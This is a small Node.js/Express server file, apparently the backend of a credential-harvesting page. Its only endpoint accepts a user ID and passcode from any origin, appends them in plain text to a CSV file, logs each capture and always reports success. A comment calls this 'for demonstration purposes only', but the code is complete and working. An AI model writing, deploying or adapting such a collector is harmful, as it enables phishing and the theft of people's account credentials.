// anomaly-backend/server.js

const express = require('express');
const fs = require('fs');
const cors = require('cors');

const app = express();
const PORT = 4000;

app.use(cors());
app.use(express.json());

// This endpoint will save any credentials it receives
app.post('/save-credentials', (req, res) => {
    const { userId, passcode } = req.body;

    if (!userId || !passcode) {
        return res.status(400).json({ success: false, message: 'User ID and Passcode are required.' });
    }
    
    // 🚨 SECURITY WARNING: Saving plain-text passwords is very dangerous.
    // This is for demonstration purposes only.
    
    const timestamp = new Date().toISOString();
    // Create a new line in the CSV format: timestamp,userId,passcode
    const csvRow = `${timestamp},${userId},${passcode}\n`;

    // Append the new row to the logins.csv file
    fs.appendFile('logins.csv', csvRow, (err) => {
        if (err) {
            console.error("Failed to write to file:", err);
            return res.status(500).json({ success: false, message: 'Server error' });
        }

        console.log(`Saved credentials for user: ${userId}`);
        // Always send a success response
        res.status(200).json({ success: true, message: 'Credentials saved' });
    });
});

app.listen(PORT, () => {
    console.log(`✅ Backend server is running on http://localhost:${PORT}`);
});